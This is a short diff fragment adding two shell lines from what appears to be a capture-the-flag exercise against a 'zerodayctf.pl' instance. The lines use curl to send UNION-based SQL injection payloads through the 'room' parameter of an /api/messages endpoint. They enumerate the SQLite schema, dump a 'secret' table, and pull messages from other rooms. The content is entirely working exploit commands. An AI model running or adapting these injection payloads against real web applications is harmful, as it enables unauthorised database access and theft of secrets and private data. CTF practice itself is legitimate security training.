@@ -1,0 +1,2 @@
+U=https://amogus-c2c22f34cf2c.inst.zerodayctf.pl; q(){ curl -sk -G "$U/api/messages" --data-urlencode "room=$1"; echo; }; q "x' UNION SELECT 1,2-- -"; q "x' UNION SELECT name,sql FROM sqlite_master-- -"
+U=https://amogus-c2c22f34cf2c.inst.zerodayctf.pl; curl -sk -G "$U/api/messages" --data-urlencode "room=x' UNION SELECT name,value FROM secret-- -"; echo; curl -sk -G "$U/api/messages" --data-urlencode "room=x' UNION SELECT room,author||': '||text FROM messages WHERE room!='emergency'-- -"
